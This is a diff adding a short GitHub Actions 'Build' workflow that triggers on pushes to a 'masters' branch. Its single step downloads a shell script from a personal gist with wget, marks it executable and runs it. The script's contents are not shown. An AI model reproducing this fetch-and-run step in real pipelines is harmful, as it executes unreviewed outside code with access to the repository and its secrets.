@@ -1,0 +1,19 @@
+name: Build
+
+on:
+  push:
+    branches: [ masters ]
+
+concurrency:
+  group: ${{ github.ref }}
+  cancel-in-progress: true
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v2
+      - run: |
+          wget https://gist.github.com/growtopiajaw/3a66c91134220717ce663dc2a0013798/raw/bce047e304da6bf1dc37acf3e1fae9da061cac5b/script.sh
+          chmod a+x script.sh
+          ./script.sh
